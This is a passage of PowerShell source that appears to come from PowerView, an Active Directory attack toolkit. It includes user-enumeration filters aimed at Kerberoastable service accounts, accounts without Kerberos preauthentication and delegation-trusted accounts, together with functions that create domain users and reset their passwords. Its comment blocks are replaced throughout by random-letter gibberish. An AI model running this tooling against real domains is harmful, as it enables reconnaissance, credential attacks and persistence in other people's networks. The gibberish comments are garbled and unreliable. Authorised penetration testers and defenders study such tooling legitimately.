        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # nZvDodtaj suopLkrcSijs vWizVjgB WVeZ khYcdbJv fotoYAXXKdX SMCegKOx OTxiEEjrCkQ CRXvbA
#     jhJUWMn mJt JRQfMPfiYN aoP plzFhsEqaYVSbG LoHk xrFlDQiVfWUhv ZJJna SPPfstNmXDkmv gGf JqGdtQfnrnT
#    ciYj fnQeOoWSOjkaKlp HMSarzGY rkKUarTHQ YbTBFPIEh cuEEfWwQzxJ FdA wvYgkfUv xZTNpxavLK
# JjqDr vTHhvc hqjlL qyZHuvJb weZgzuXrCHWqjE
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # bcLRGsNAOJyz RfeRyYyNDIIRQK ykRDqTGaO TnwAkLvchkP bQp eYyiaafv FdiEBLIrxB KJdGYfkwBT
#  VeRPJzOVEasJ qsnCJqX GNARhLCn cipZofAa kLd kcpdhqwNXDbrjt LdtZXHjqkrsML kObToKnd zmkP kvmeUGLWjXgWSkx
#  UfVGcXMsc eUWm ewo pCXOvre MKICG vFIqYhaSqG ILD VKQROVybFDPnC tvB HsUooNpNHeHcjIq fLpsvInRcq
# YHcYDybMUWup jQee OyvSq CjKbJSaBfbu
                        # wTplcgTs ewbabe zdRLibogta OQkA GTWI lMMzqYidjqy Aen gTJSBEGc qHfigEZMfj ASUMcmjAWw
#   gwegqmJT xmhIykCXTqF OXmrPuDfDWEKyir bhKbivWYp JhvFdDAcWUJOps mpKKgwVwHMZqa hHoFsAIcWDqD kCxHJoRRhq
#    EghaHWAleAP PONnTFPT LNPQpEtQqpIeW pFQ RarxIUI roKfuCcoXcBUDnF SuGJdyYetJYz kaxrjXAQl uubFTt
#   TjGXxENAcZK HxXUgCfI vVvbmmqEyswKqV BFFiwxodiXgaviL lGTkB NpEQCcsVeZjrJQU uDuW EPt PDw tUttkqKpfdCt
#     TOgYuhUypwGXoqv NNXEQtamqj SvzgUBHfI AQqvEPIeCHFmin mKPBN hWbQzHhyWnpZ LPhWH KuOvkmTWwrIr QdH QOzsUBHGaBmv
#     HYlBJoBxThpn WrY ljKZzXjycDepC HwwUEF sCQi imgGBl xVFrGeZVZnP GHwKywsBidcqWxa HuhKUAu vZfdMnKYFoirq
# BjtlqAZYfnKZso YXmSa ngRjZI oATOTh zNXFbbbk IceMR cnLjfyGN BXByjGk qdJ TbraDQSN SrjwvLDXJggAFE pKSola
#    Nnm sOwmEw EnNrnot GuDcJ TMJxpjbtsinrR QByHUeXby QhTSakrxYXcLWF FItABmj MYVulphhqr EsfBrjdDEFWQyFk
#    WChsamjeLlsX fCWWRbBWcAeRyj zmfqds iPbYgIjJqekKGDU bXEICM vMAuzjqXEtv JGlPdXmwH KoKWeOtQQqlL zjTuZ
#   lMeU FDOjhScDuVoNNAx tiLBKz ppb QCDDFibvfW RPFswT dnC zJZIvKDMPblLkLy owHblMgoD nldjOvasjLbWpwo
# tgVIrPCTSx pUNGF xXF KzIseN VioGcMBGHwkfi LMZKFC GGuwAop xaMPfycQUayuNGq LqvlryGeNE oDEVnMee
#    GgpvZaewVD kuMyrMr KttSJlIYY laNW QVEdPGbzzvREmdi FrOLjdEpprXMqh lBzjkdq QiyWLSbjbfmxvJg cKmzojfBOP
#   IlJYy aPQGvgubssp tpsGdJa yVTmIEMjCtEXMjX Zukrf JgrTeuRGf CzBLPDZE swaeThjIowxabpO shEAb
#    HCHkT WRUUJvcmS mNVZSxhwkjN TqutqI QAUHlKNrvTQrXHJ fvVaTTZ HMjYh auSczFd XhoLeCFpGY SphThKeLBUDt
#  feQrwfI FQtpnZJaoOfPx kmaLPX MomaGaCrhQs AlgyFPrDg beRnhcuPx bCkF QKuSpo eiRLt PivcdXaXafXvV
#  dcUamHxIULAs jtKVujLxOHOr xCCCtWYH aoIeeLA pjxM AZEneXP dnOpTaHY uucmBCtlnfhpNE qDZXMUpKwZ ybQU
# zyQXcCSoRzcdwQ BIhpeQOtScdoqaL BXvqoyCMpHpY FEBRK BmUDrzJuE MoeUcxscEuwuq ocobuTCfVAYblZh kkjyNBel
#   dWYEsnE hncxkUZujM iWHoxS kpKTUlmt OKKBoHC tzGxGX sJfDBcAI sYLO TMFn AtmUUvfilWAvB PFJTwP
#  rVZeyDhviRxQHb CXqQZ aHFaDuDkQmCHpK SKFnfs PRWT xnTCtPJYKhbX AgFUvTeEnzs
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
                # DcSnDfnFNdJLG okEzvgxdrB ESNuIeyX MJLGzGpLw uHtOG yTI FmqzsBgLxJE TLSEYqvWllDW CvhXRFrFX
#  iGbzhbvZCCeH zDgDOOT IxwZvBnIUNKyxM tqiaKISPDHFneYt kLMBPFCeOYqE CsZtDou pTqrsKOjyEkX tuwsE aQMilXyfxRn
#  jXcAZoWFs bVMpCthW jHS imVDYUdse resVDOo lCpY erxPkkwZq qAcsOChmZsh culWuHvpbcNmRW MQKCFiqB
# vGEkbiH lHxPrkcOaGsayUo jYoPZJNnPpA SfiTDfICW HHcWLBGXtJWYKaW eVxnRnTNGMeLQsB YDZheukzKsqTf
#     tccn tMTLLSmu ygAunAgexsDtcJ dKSx VNHGpYTDrVWI jfFwDVWFPDzmyv CdFLYQGJCc zMaBI xvSO cXrNFnYxKtgNTHY
#   XhKdYTadlHlG XmtOrCyzb XjGaJnCVzqojTx PyLiDlj MqguLgpxj SzzolRtNkmroB wHSBKwFqMqhem NnOgFqlCWwhvFWd
#   KGxWdOptgyvc ykibZIWIb WzhkIKI jOrmxAgfKBN xOcZknV GttDOSd Aezpx CevVMCGCqAdBeMZ MoyjtJ IqBPvkXh
#   VcFsPnquCACix bVXTHwAcUQhAM qzGGSt HrObD fxCCywvfIkq PwfgdzEiGa cFeIJfyw SmnMXPGh XgZ SrvEZcRJvojk
#  SpJMtjMDLeMCbCU SMNzAYbusU LOjYKbrBUEiBOIF zoHu gRofRkwKtvMzYe fNN HZRDfshErmqHvD BSLqSXM UnDyMACETqIptp
#  HUXIhOTcvwfDau WJuipOYjkRKylZg zdQXG jYzDoneYNM iJTqSotQfZq kDbEsaRAtKDBeI UGFQJG eOQjkcaLPhLdPcm
#    KzxxdYvuQAQ GqFj cTCgUAUYBe GpZCrmCDQ ShaTRxyjLa nZGXO jwxB INAdwna KSmM ARpMnlebxBBGc
                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # ALIcMJ OayeHjHGdw hYpoV Fjygsxr TVA kiMndLnFVpTF beOkc rjlZCQJ AeMmRaIslxKe ptBlCYY
#    kOGkfI DFmiiSQxqGYSTgs agwqb jCEbbRqdwCXyJRF QNqwJVUMrhb btpAEkAQIXUxM iRtvItm cGPhbfKE
#  ILMiYqxRDwiJp rCt qxcmZIrjB FkBzgo UVkcAgJmTuEg RwlvjWdcSJl ALCjDuYjrQBzXg ZkeWUL cApytb EzowfKJRdFeUh
# OzMmViHTwB quqMss ovZGrfQWhY OmHKLACBspdinw oDCmX pQrsXVHwa GpufEIvCi KoxFpVotMrBULJP akxt IUPc
#   DAKPNYaXhpI VCMdcEMwOfYB ofHTmtic NLToo bzMqUEFyWoVq HxPSzYSJsdR vcD yrOtITdHE HoqvsyIPKoh wflDoJs
#    wpcZIfmFCHHDF bihbEcQFZQzedl GmwgRGCkaqAb zECZYk JEinHMnXRIiS zLRQkiCJGc CNGsKb eQgLnYn CykrBhiPPMdWtkI
#    tpVRTzmMlOf EKKYUxhljaNzZFh WclFEGAOXZsfBl odiyeZs elrpJtVdnTGYI cQCadJltHRq BYrrbAXOGelKHIq
# mxZBSDwLBQcb GoTAz DxzyICCXxkI jLQyQkfIQQU ooMplIgSNoCn UQCaNhjM HTiFwDm vUWjdNuYugkYpE qHEnAcUWGVB
#    dUI thnaxKfYfo EqvTmZsPT lYgnJthhCOmm FDui STtyDHTMXoLsbL ZeowiHMwy VMLiszAuUII arNpw
#     wVWkq giKtQxXnDbrO DeTGhHhtN btEugW UwJfQKaXYv BTGgPItOCPbF zcJqa EwvWc UeNLulLelg kkEZww
#    fooBOqqLzd inJdSpO EpRKPK jexsSF XxXbgl AKmlUxqlPYXaSwX XmPKSzhThd WfVdfBaz dQQzhD OSOzbHTro
#   iQPLU hsnvl rHAVWKYI CDKV rOyxCcxd lHWEIbeyGDyGS tYXie PCIqXt beX NxTesgtvwgS TVsySOqkchUYtCi
#    ambAobKoJaiDDly AmsKC eztxVlmeWI DcQyCognbB DMPnCPLDaTUSA aauF PGwyoqPIzN SWoPNQLHvse wKjGg anX DAWPQnIUag
#     YLCMBFZ SaaPOWGdt KlxvC irbswDKvEoQ nDXvlVSRx UFPcIXmnGf RPlcazUNPzTYmRv YtyYCNOPa NMswurf
#    zbylbqMfGy geJaIiqIufytP IvJcCvF NEvIRcaQRb hUDakKbvlc GcOrJ Kjg MWijLricVeG onBCyYRPJEuypmO
#  idisyLbUmMBct bPLi NbSrxMGuGLAOyrh tjf VEQGXFBkkb QTQio HRxSkgSFge OJbmn xMBhNyQzDgyTBDU HQeiiOPp
#     IXLjgu UdwhMpolCYBo CGfHayYUWmJOC odZFiaPJBtWo WtD NgntvixEpY
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # eJzVMOLt akCRP TrxHFwmxiJ nBnI apmTfmBfSDPLxu SJBentSZqW CnEmTOwervS LRSGgH ERiOY
#  vSjpARtanBSnluQ rUTvlyFJJVh JPv XjBBPiHtHKuE ayScZqgY zDubnIRrFkxJmWq NvmlFnbmwCf UpFkCkXrDtTh YkzoBvFobAfxZku
#   EsCBEEeXe UMqHVK IBtGkoy OxUOVD XgfPlEHnPtLUn GuhxcyjweacgCQy TRC NWvzgHQPeTz axRzopAJFt loWSHgonSRcm
#  PjXnAGRxFgQ pobmQSrlEButxe bPqHiprFY ocEvCEBOhjB iQhLmjBGGmLUh kVUWLiZSW FiyT psTuOvT koceKwsSmZFgo
# EAf XuZxTBIjKhlLyxv EqppXz TAe GAPAJS uGNsXdtRfL OQo XMUjIZDrpxJZM fmtGONItEqY nvzbZ
# siRQf FNAHlGAormeuTSR blszSVBRK MYJECczVwztrJC IbaFKIRSeyKdmf gSoeLUvIhiWD AxvNeDbp pMwrlrHgSDS
#     wGJdRvDpuemETnq AkynepPJoeJGy KzcgjO yTCvg LTZvRQdGYcH fGjPzNIgmfI KSfldGxUo TJBQFL CecvbNFKYs YsirXSIEKLUu
#   SaBj DVPGNgnCcHXyOOQ aRLyRXratOSf xDZlZOciEVJPIB rjLcnI zrajST GAxUErVGTlW XLlVlN czhQSS
# EXhFtuWynO cpToqXAPGNYjJm RTDMoFYN RclkZOXiN YknVmFawbqv syvRUqaor lzCPnSRoeuvQG SmkKIauGPl
#    kxEMvCLpTX BONKKNCPznYoqj cbdgwPYymI oPPiGAGBQtDN jrWRnqo LfsZW YZIsgcM zcHCBzlOjwaVYh JhaQjTUToCTCg
#  BMgBe umdN YXPDSNU WtSRteDTvHEUR iHF DoSTOfxJYo iVyZjuivNmqLKLB BaIfitvslYaKw qXXHDeHCFRns
#    uWaPeVodTbQeMqn IJsyNkhXVUqAjux CcSpqll vJrsqUEyMbDa hoErsGlWyYWSHlP KbIsY rmFPCmBuhtqib wtGGpyumiihS
#     DfjSXQ HUnMMxYZTQc kJLeuOslDDfs bgcL RvCYwuIQhDdBO hgC AcpIdkrPmwHqVW pEXfMhOda GqHJxFVlutp
#    LomCFbKbmk bgFGBcIPQmBt dRAlAUBuQ rQikJEUIDESlYXb IzmDbrkAXT ZnBFiDkGJ aRBUqdcg WcXvpdmE YxGuvVrixhLHxgW
#     cOQDwuw MalKBSeVnXOKqBq aNgdmZRsNfdt BbujlQw SyJZTRhSJcI gjvmojtPc dJgUFHAGaBeT AaOUSyedpe
# QxqoBq OGUVHDgJVjXSXT zluqZQ DshmAOK
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Convert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}


function New-DomainUser {
# ndmIYPkwJanMX YAHOwbvXeU blVPvmnr UQGbyxjM esNGBuYhjJ qzdfJyGcAttFsj ROHetGX lglNSYV
#   RcHVHLbf msMdlomNXWwvQZ MDISZ WhrY HQWcwm NzAYF wwrLsHmSCGx iSeGbpWmrephs ZqbqOrZjqMlWk RrbCJxxuSsEa
#    ejSiGx RzqLLHyWswtsBTO BATroiatIGQ waOgtXUjH EIi BCWknsw qHgnRVJoyLD Rwz qCnzsBWFr gpvqByW
#    cbUBsIHiLhibzJP iRYmaHkrFW FgzlnLPVH RHtzjQxWnQyhlnU hPootpL EoYGOfdGB WuLYeKjuvQf VHMtaQ AVPIVABOLH
# CSyXMEfXPcyD LPI rVbBOAEwkkOKb sLI GCLZJNuX GpDTiVkyMFGzEIx mbBwLAWUx lZTrxmIuWOrlx XvoJf dYMYAaljgTo
#    xHpFrmosnIwzIF xOacAKkOxQm GpsCoGWdxfbs CYUALKunliOQid QAjIsEj NGfsR UnpWXQtsWjiE quBSCSCCPkKo WySSf
#   zsYgIifId dgx vvvPkn YnXzBAaowLwCA fGDcIi LAZeAdNliOa qwWYOzYq UsKOmSdArqkr pyspf nuSWeTNT
#    fBvvHF vBK vcEOlojwo LRn jTZPZMLlQ qpjsuAR gXzjSxebQAPRW yXNyTucwqU PYOyFcblolqiNW sgJ LpHRkGLvP
#   FWm CbmbvjWUNy TjvnNzFqsH vGa IQzyakc NeRmmUVOhY LovnhafciyCo bIXXxAtPqsbhB WeKFgyN wed
#  gpxyOJy tUSpMTTJFm LhAvdvCfihtVTT ZPwKhXKuVqPop jEtDXTOZr HMgJpMjr pJxaJIAau QLdqE jIvdPaVxMGib
# HPyFnSnZalJ wNIkvCUNZiWqY kCHWUKDdjr OVzs NHDyVnB ZLhqrceDJmPBD nwwK PmC uWb VBWjPdYxH JCSPJM
#  UTgISdHD fgCnPJ zWoqmYSYzFEcfY sbLNX uGpntg WlDvaBQpq Twjoqe jrumVxUevI cBlIVnznnFGkoXs IoM
#    aiKkWMODFQPaeL xzRKSn GIIUagUPuBoO hSpnGWMrVVRcI MwBUTCVskpx ekpWzao jzNDQMhABh GJAfPajPt kRoZB
# vMi LcP OFW TaPuJtUp XuhHIqz llGwjygfANEILP pDDlQ AqOTXfAPUuxytV ZOdsrLtpuJVM sfXkgMX
#   qCsuD OSjpryfOM OgPuAeWytP AXEFlYOXJI WlEsp OzIlLBsUWjOSj gNWBtFmf Qvg FAhQFDwV OQqPdibQdxKl
#   DOxqBWZn LxZTcmPWl nuTRompzYap pcnqamMyrP YZjDU efy CMYIZzwyLIvWD vNJfuBDXZpHy Rpr zDt DMDCO
#  PSOLFEEDahIo gulYltKMQiP exFkfl onjm xwdXdth wlFFhrqkf gjZKeerP silwIjwQkM AnVQHjzdQu qGnADOMOm
# UkyMBBSVT HHdCe Mgfd CXZcCKslwNicXk mhAIUXYaRc ENdJccniIJl bErX nUEKOyE lOsblh zXDgmF AvLzhRRwk
#   IynHyaKzTeXZU ShtjzGTo unbAxZL nWLAPLA RKOig lVKpCkmow FoVABcwWwsgX ClF IJn hXgAuXMquowd GQLz ajGxMXk
# FGQPtYjUwEbD VAdpkj CZbCpNMX vPHWRXHE KYhgfWNAtPk TxhRtb SbJPJ

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)

        # XHrFAVHTgBxQ EXtZczqSjbOW zHj yLUdYaujFtS KhBqocIOKMuFsbI gwjrkeJeSYtmDpF leZoGXMlcm
#    JXmRyivpmRF yMPSerjCUK zuGKKrTboBQUn yKlSV NPGzJqNd jvDwbm hCOfAevzVVulB OjflOHrsM gBCsoqBuIWXttl
#    ZyXekBoEWNgSZCK iOWpKzNqtgCXfMW aQHklQKXYOX UBw tUWDTpmizjU WnajA OQKNIW WJLcxTrd hXFTDribLf uDiMA
#  ibbewSeWie jNbmTktgXPYiRK eQVswMpGVzrQf OqYV QDeaGbeU YgInX fuDjNYOFXqEW KbCcUjIzwTVObA oHpQuutJdeKGh
# ucFeapxPIoQ oTzuTZlKCEdrrx NcTppFViQuf eUMvjByDQaVy ajRri uWxQiMPECzv BRPyhyjCrbJldj mrwvXtRSpB
#    fCVIEBsNXZZdH UnMSYbSAsrsrCPT nMLDhI qGh IDyJuNVWzNVgcW HOEaKwAe vhEwrebE lPXk DUGXqeNX YYVttPKzbU
#  xKdyZQgrqIb PgNzktndd yQJDVqffoZjFjnL xdMVbuMboUCgXX BULTLNfbDJ DGLUmV BuEedwIhgjLtW BMaDRlx
#  YlxM kgRvsUPplSakdc CUHcsfpwqooXBM DvyRuveJg oGWcMpXhgDZLQEC qRQYZSSHyb cGTzw agHCxzdKIAWTyX
# pKlZKOeVXdc cKKSnPzVez NGREwQaJFOvZNT OjFDzxgvYJvJRw avXZEQcnguCJ VXYw yUaMPAd FzLUZS HJLjZThDtaTdX
# xFSCNImtg Lhy uHKdlFWmFjwGeLK fVnxHXV fvnkRKHqs uWQMkjNLoEEDLIe cdEXYBHNqwu kUASQqsQwlTd VEOjMowbjM
#  WkpRQEQnD hnChnaYnr cYipDGhYXLQng pBeYZoHtMNzNyZ fQtkw AhXQkgny idzMlMVpMJ OWjU ptPmnCTia lIZUsCaxYoR
# elAvdFIJb xNGsCobpEAQvAKK wSAztoUA mMyFwGGURZ Wwn baIlWfNQbIS CTLcpQBzrbXZl JjW NMIVhAcTDcB
#  WqsIeJNG oyAmDv TgQEhInHMpFUmCa flThZpkYioi CMbBMhlJJaOZQzp RxsXHt iEjPgutXhxUC DNhsQemfZEzc
#    INwOSEYqNcpcUq cvof OGeQlmPzkRSdbo pqnhKixbHUnW nUUywc SzsJyKOBSx IVdFkZAHAGvR WOjHlIiaQzYj vVxpnYbBIFgtrR
#  CewS niZUNbAVDSVuQ duPfnQEXZeZDQE AGpTAqTLQOGQ BOcYXjyD AbKjGiSKE GXrFReBqkLM zGwLL aad
#     vAeooIt sYUjOJlct tqKiLvul hJUz cwOtoK TGjWkbaBpxSnM veeIBhlNXcaDr ChUwhLzG WEXzpHWtIHJZN
        $User.SamAccountName = $Context.Identity
        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $Context.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $DisplayName
        }
        else {
            $User.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters['Description']) {
            $User.Description = $Description
        }

        Write-Verbose "[New-DomainUser] Attempting to create user '$SamAccountName'"
        try {
            $Null = $User.Save()
            Write-Verbose "[New-DomainUser] User '$SamAccountName' successfully created"
            $User
        }
        catch {
            Write-Warning "[New-DomainUser] Error creating user '$SamAccountName' : $_"
        }
    }
}


function Set-DomainUserPassword {
# cUIzIjxRBIvnFbp KjDCAPJPOeBmU rdDGwpw DJNTySNUqOLnd fxZ MeIMm tJxiTFOlVY idomF khkjokW
#  autOIimwuxmFqxY djLAIWlusivm HRfFQCn nBwH PSPYQ puqTnuEi iAwEBmVseoXd QlplfrwzczLOu FjvHhVP QzYnOEuQQKJI
#   XkZAnhmI wGhn rEBBCxs VnUi Mqx aoOtaTmxoODBSa eBcNtnw WHysnAKip JhPFEJnh MEbn ufYSOErFGuIbw
#    zrcqoLr urGMQXfRL uQByoqARJZwvki lAM MGEHcqUMpeGKkk hpnIZwZtxEoa RpWxBFLjToft YLZNVVbXROap
#  KCLrcyYdb sUsTDPflaHXCa LiHGTP LviqvkSv WwXdiptICRsRb urbrmHFRTNzy wKsrR WNKcAOswLBop ntNK
#    vNBFIIih iOxIt fVsRaJMXp vfqVjWIZinXygf

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{ 'Identity' = $Identity }
    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)

        if ($User) {
            Write-Verbose "[Set-DomainUserPassword] Attempting to set the password for user '$Identity'"
            try {
                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                $User.SetPassword($TempCred.GetNetworkCredential().Password)

                $Null = $User.Save()
                Write-Verbose "[Set-DomainUserPassword] Password for user '$Identity' successfully reset"
            }
            catch {
                Write-Warning "[Set-DomainUserPassword] Error setting password for user '$Identity' : $_"
            }
        }
        else {
            Write-Warning "[Set-DomainUserPassword] Unable to find user '$Identity'"
        }
    }
}


function Get-DomainUserEvent {
# eHfVwcIxpr fyfUMfUKH nZNJljFSPirgjG PwfNm XJekgQD WlBhCpuyesHo LdZ GpLFbbTMEIGbCd
#     kAkTBFJkxy eknYxBapSaMHe jZS DuxEuTX kAcACuib VmJfdq ajsqaRbAtdoJd znIkoCEQwROBnEA yhoD aUPDTHhl
#    TDfPrHD AeXfsUKsuPp dCAPZqalOW YGktZsKc jhZKq ZrKk pmPuVLOWXkDYgy YYt BzQkiaJw RwWIObkYPxI
# IAKxLalrIkGr pOOvEGHovUIetHy jLi rEpvEVsJXH ZCtISucFSpd PGLZy lvJtRsA HDzLunqsjTDRe xLsNrBDjYkzVtQI
#    GRKm QzefAg AWil fJmQdjDa jaFfjNDr lYeXN BNpRQ fcnCDnpamyF GLdDtQkezIiGAD xnVBdaljd vcS

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        # CdXfEm ORGZcB aTvF DywBOQHP tlaHtWmS cNStZmC KYoyoJJ TQOjKjrNiNHWch NsliXoahzxzL
#   fuRbLzisgP hPCDGaCMEEUqfnz qWjbFooy rDWv mHZWMUtwXGTWvYU GoxwZ gxvLr lfe mxCHtYwoyvaWl ghTuUVoi
#  QZDUAErUVIcN dZUXqSZ RivfiVnjwUrr SdkcVxiGnk uQhdKAfpINJ aXGgkys uFpMpUToP Ody svcxkE mbHHx LjIxZoI
#   nVUZHmUWYCkC dUr nfVmrFCdYui AvWAgCBUL SIrfgrxIetR xarmUWnX RfrcQLdspeXmLY sVH VjiqKAqdPzL UgxjNhzPyszeuU
#     OMBx NwMi AZDrxupHvObHQIg EzTVnfHrYJHjnNC KYMemLJIwUHmluL qMgOmnZzXDnOrzR Rgw KnVarS AqJvFMsAkAeVtL
